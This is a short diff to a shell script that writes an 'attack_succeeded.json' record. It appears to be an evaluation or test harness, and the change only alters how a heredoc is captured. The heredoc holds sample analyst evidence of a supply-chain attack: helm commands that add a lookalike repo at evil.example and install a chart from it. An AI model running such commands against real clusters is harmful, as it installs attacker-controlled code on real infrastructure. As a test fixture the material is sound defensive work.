@@ -19,7 +19,7 @@ fi
 
 timestamp="1970-01-01T00:00:00Z"
 
-read -r -d '' evidence <<'EVIDENCE'
+evidence="$(cat <<'EVIDENCE'
 [analyst] Observed helm commands indicating malicious repo usage.
 helm repo add stable-lookalike https://evil.example/repo
 helm repo update
@@ -27,6 +27,7 @@ helm repo update
 helm install cluster-observability-stack stable-lookalike/cluster-observability-stack --namespace observability
 [analyst] This sequence matches the badblueprint tactic of installing from a spoofed repo.
 EVIDENCE
+ )"
 
 temp_file="$(mktemp "$output_dir/attack_succeeded.json.tmp.XXXXXX")"
 
